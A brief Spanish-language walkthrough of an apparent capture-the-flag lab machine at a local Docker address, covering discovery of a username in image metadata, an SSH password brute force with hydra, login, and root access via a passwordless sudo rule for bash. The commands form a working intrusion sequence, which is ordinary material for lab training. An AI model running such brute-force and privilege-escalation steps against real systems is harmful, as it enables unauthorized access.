## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web vemos una imagen de un huevo kinder, la descargo y analizo los metadatos:

```bash
exiftool imagen.jpeg
```

Encontramos un user (borazuwarah) y le hago un ataque de fuerza bruta:

```bash
hydra -l borazuwarah -P WORDLIST ssh://172.17.0.2 -t 64 -I
```

Pass = 123456

```bash
ssh borazuwarah@172.17.0.2
```

## Escalada:

```bash
sudo -l
(ALL : ALL) ALL
(ALL) NOPASSWD: /bin/bash
```

Vemos que podremos ejecutar el binario bash como el usuario root:

```bash
sudo bash
```

Y listo.
